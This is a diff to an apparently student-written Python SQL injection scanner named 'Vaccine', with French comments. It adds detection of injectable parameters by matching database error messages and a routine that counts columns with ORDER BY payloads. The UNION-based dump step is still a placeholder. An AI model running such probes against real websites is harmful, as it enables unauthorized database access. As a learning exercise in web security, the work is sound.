@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import argparse
 import requests
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 def args_manager():
     parser = argparse.ArgumentParser(description="Vaccine")
@@ -29,37 +30,76 @@ class Vaccine():
         self.url = args.url
         self.method = args.execute
         self.output = args.output
-        self.session = requests.Session() # Askip c'est pour gerer les cookies faut que je verif sa 
+        self.session = requests.Session()
+        self.db_engine = None
+        self.vulnerability_param = None
         print("Initalise the program")
+
+    def find_columns_count(self):
+        params = self.get_params()
+        for i in range(1, 50):
+            test_param = params.copy()
+            test_param[self.vulnerable_param] = f"{params[self.vulnerable_param]} ORDER BY {i}--"
+            resp = self.run_request(test_param)
+            if("Unknown column" in resp.text or "order by" in resp.text.lower()):
+                print(f"[+] Nombre de colonnes trouvé : {i-1}")
+                return (i - 1)
+        return(0) 
+
+
+    def get_params(self):
+        parsed = urlparse(self.url)
+        result = {}
+        for k, v in parse_qs(parsed.query).items():
+            result[k] = v[0]
+        return(result)
+    
+    def run_request(self, params):
+        if(self.method == "GET"):
+            return(self.session.get(self.url, params=params))
+        else:
+            return(self.session.post(self.url, data=params))
+        
+    def detect_engine(self):
+        params = self.get_params()
+        errors = {
+            "MySQL": ["SQL syntax", "mysql_fetch_array", "MySQL Error"],
+            "SQLite": ["unrecognized token", "sqlite3", "SQLite3::prepare"]
+        }
+        for p_name in params:
+            test_params = params.copy()
+            test_params[p_name] += "'"
+            
+            resp = self.run_request(test_params)
+
+            for engine, signature in errors.items():
+                if any(sig.lower() in resp.text.lower() for sig in signature):
+                    self.db_engine = engine
+                    self.vulnerable_param = p_name
+                    print(f"[+] Found {engine} vulnerability on parameter: {p_name}")
+                    return True
+        return False
 
     def make_request(self, url, method="GET", data=None):
         if(method.upper() == "GET"):
-            return( requests.get(url, params=data))
+            return( self.session.get(url, params=data))
         elif(method.upper() == "POST"):
-            return( requests.post(url, data=data))
+            return( self.session.post(url, data=data))
  
-    def check_vulnerability(self, payload):
-        params = {"id": f"1{payload}"}
-        response = self.make_request(self.url, method=self.method, data=params)
-        errors = {
-            "MySQL": ["SQL syntax", "mysql_fetch_array", "MySQL Error"],
-            "PostgreSQL": ["PostgreSQL query failed", "PSQLException"],
-            "SQLite": ["unrecognized token", "SQLite3::prepare"]
-        }
-        for db_name, signa in errors.items():
-            for sign in signa:
-                if sign.lower() in response.text.lower():
-                    print(f"# -- Vulneravbility founded : Type : {db_name}")
-                    return(db_name)
-        return  
-
     def scan(self):
-        print(f"# -- Scanning {self.url} with {self.method} -- #")
-        db_detected = self.check_vulnerability("'")
-        if(db_detected):
-            print(f"The target use {db_detected}")
+        # 1. Détecter le moteur et le paramètre vulnérable
+        if self.detect_engine():
+            print(f"[!] Cible vulnérable ({self.db_engine}) sur '{self.vulnerable_param}'")
+            
+            # 2. Trouver le nombre de colonnes
+            col_count = self.find_columns_count()
+            
+            if col_count > 0:
+                # 3. Étape suivante : Le DUMP (Union Select)
+                # On verra ça juste après
+                pass
         else:
-            print("No sql error detected in the payload")
+            print("[-] Aucune vulnérabilité détectée.")
 
 
 
